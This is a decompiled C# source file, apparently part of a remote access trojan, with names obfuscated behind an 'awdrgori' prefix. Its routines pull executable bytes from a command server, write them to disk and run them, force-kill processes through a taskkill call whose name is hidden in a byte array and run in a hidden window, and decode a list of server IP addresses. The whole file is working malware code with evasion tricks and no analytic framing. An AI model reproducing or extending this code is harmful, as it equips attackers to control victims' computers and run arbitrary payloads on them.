using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace awdrgori;

internal class awdrgoriOCMD
{
	public awdrgoriMCDM server;

	public awdrgoriOCMD(awdrgoriMCDM lID)
	{
		server = lID;
	}

	public void awdrgorido_updated(int uType, string switchType)
	{
		try
		{
			byte[] array = server.awdrgoripull_data();
			if (uType == 7 && array != null)
			{
				string text = awdrgoriCONF.awdrgoriget_mpath() + "tmps\\";
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				File.WriteAllBytes(text + awdrgoriCONF.awdrgorimainApp + ".exe|awdrgori".Split(new char[1] { '|' })[0], array);
				awdrgorido_process(text + awdrgoriCONF.awdrgorimainApp + ".exe|awdrgori".Split(new char[1] { '|' })[0], null, sendExp: true);
			}
		}
		catch
		{
		}
	}

	public NetworkStream awdrgoriNS(TcpClient awdrgoritcpsck)
	{
		return awdrgoritcpsck.GetStream();
	}

	public void awdrgorido_process(string filePath, string parms, bool sendExp)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = filePath;
			if (parms != null && parms != "")
			{
				process.StartInfo.Arguments = parms;
			}
			process.Start();
		}
		catch
		{
		}
	}

	public void awdrgoribreak_process(int proid)
	{
		try
		{
			try
			{
				Thread.Sleep(100);
				Process.GetProcessById(proid).Kill();
				Thread.Sleep(100);
			}
			catch
			{
				awdrgoridieProcess(Process.GetProcessById(proid));
			}
		}
		catch
		{
		}
	}

	public void awdrgoridieProcess(Process p)
	{
		try
		{
			if (p != null)
			{
				Process process = new Process();
				byte[] array = new byte[12]
				{
					116, 97, 115, 107, 107, 105, 108, 108, 46, 101,
					120, 101
				};
				process.StartInfo.FileName = Encoding.UTF8.GetString(array, 0, array.Length);
				process.StartInfo.Arguments = "/PID |awdrgori".Split(new char[1] { '|' })[0] + p.Id + " /T /F|awdrgori".Split(new char[1] { '|' })[0];
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				process.WaitForExit();
			}
		}
		catch
		{
		}
	}

	public void awdrgoriremove_user()
	{
		try
		{
			byte[] array = server.awdrgoripull_data();
			if (array != null && !File.Exists(awdrgoriCONF.awdrgoriget_mpath() + awdrgoriCONF.awdrgoriremvUser + ".exe"))
			{
				File.WriteAllBytes(awdrgoriCONF.awdrgoriget_mpath() + awdrgoriCONF.awdrgoriremvUser + ".exe", array);
				awdrgorido_process(awdrgoriCONF.awdrgoriget_mpath() + awdrgoriCONF.awdrgoriremvUser + ".exe", null, sendExp: false);
			}
		}
		catch
		{
		}
	}

	public string[] awdrgoriserverIPD()
	{
		string @string = Encoding.UTF8.GetString(awdrgoriCONF.awdrgorivpsips, 0, awdrgoriCONF.awdrgorivpsips.Length);
		return @string.Split(new char[1] { '?' });
	}
}
